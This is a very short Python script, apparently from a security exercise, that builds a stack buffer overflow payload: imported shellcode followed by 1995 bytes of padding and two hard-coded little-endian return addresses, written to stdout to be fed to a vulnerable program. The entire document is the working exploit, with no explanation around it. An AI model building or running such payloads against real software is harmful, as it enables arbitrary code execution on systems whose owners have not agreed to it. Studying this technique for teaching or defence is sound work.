from shellcode import shellcode
import sys

sys.stdout.buffer.write(shellcode + b'A'*1995 + 0xfff68e78.to_bytes(4, 'little') + 0xfff6968c.to_bytes(4, 'little'))